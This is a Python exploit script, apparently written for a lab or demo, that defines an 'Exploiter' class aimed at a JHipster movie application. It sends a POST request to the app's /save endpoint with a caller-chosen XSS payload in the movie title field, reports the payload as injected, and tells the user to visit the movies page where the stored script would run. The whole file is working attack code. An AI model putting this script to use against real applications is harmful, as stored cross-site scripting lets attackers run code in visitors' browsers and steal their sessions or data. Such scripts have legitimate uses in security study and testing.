import json
import requests
from Sample.Logger import Logger

class Exploiter:
    '''
    Exploiter. This class contains the methods used to exploit the vulnerability
    in JHipster.
    '''
    
    def __init__(self, HOST: str, PORT: int):
        '''
        Loading information and initializing targets.
        '''
        self.logger = Logger()
        self.logger.print_banner()    
        self.target = f'http://{HOST}:{PORT}'
            
            
    def set_XSS(self, xss: str) -> None:
        '''
        Set the query to be run as exploit.
        '''
        self.xss = xss
        return
        
        
    def run(self) -> None:
        '''
        Running the exploit. This method will use the requests library to create a POST request
        and inject the JavaScript malicious code.
        '''
        
        # crafting malicious payload
        movie = {
            "title": self.xss,
            "director": "Vulnerable",
            "description": "Vulnerable",
            "overallRating": "9",
            "publishDate": "2023-03-01"
        }
        
        # Making malicious request: POST http://localhost:8080/save
        self.logger.log('Making malicious POST request.')
        self.logger.request("POST", f'{self.target}/save')
        response = requests.post(f'{self.target}/save', json=movie)
        if response.json()['success'] != True:
            self.logger.warning("Request failed. An error occurred.")
        self.logger.success("Malicious payload injected <.< !")
        self.logger.log("Try to visit http://localhost:8080/movies")
        

        
        
        
    
